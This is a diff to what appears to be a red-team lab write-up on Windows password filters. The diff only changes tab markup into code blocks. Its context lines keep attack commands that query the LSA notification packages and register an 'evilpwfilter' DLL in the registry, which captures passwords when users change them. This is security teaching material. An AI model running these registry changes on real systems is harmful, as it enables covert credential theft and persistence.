@@ -10,13 +10,11 @@ This lab explores a native OS notification of when the user account password get
 
 Password filters are registered in registry and we can see them here:
 
-{% tabs %}
-{% tab title="attacker@victim" %}
+{% code title="attacker@victim" %}
 ```csharp
 reg query "hklm\system\currentcontrolset\control\lsa" /v "notification packages"
 ```
-{% endtab %}
-{% endtabs %}
+{% endcode %}
 
 Or via regedit:
 
@@ -90,16 +88,14 @@ extern "C" __declspec(dllexport) NTSTATUS __stdcall PasswordChangeNotify(
 
 Injecting the evil password filter into the victim system:
 
-{% tabs %}
-{% tab title="attacker@victim" %}
+{% code title="attacker@victim" %}
 ```csharp
 reg add "hklm\system\currentcontrolset\control\lsa" /v "notification packages" /d scecli\0evilpwfilter /t reg_multi_sz
 
 Value notification packages exists, overwrite(Yes/No)? yes
 The operation completed successfully.
 ```
-{% endtab %}
-{% endtabs %}
+{% endcode %}
 
 ![](../../.gitbook/assets/password-filter-updating-registry.png)
 
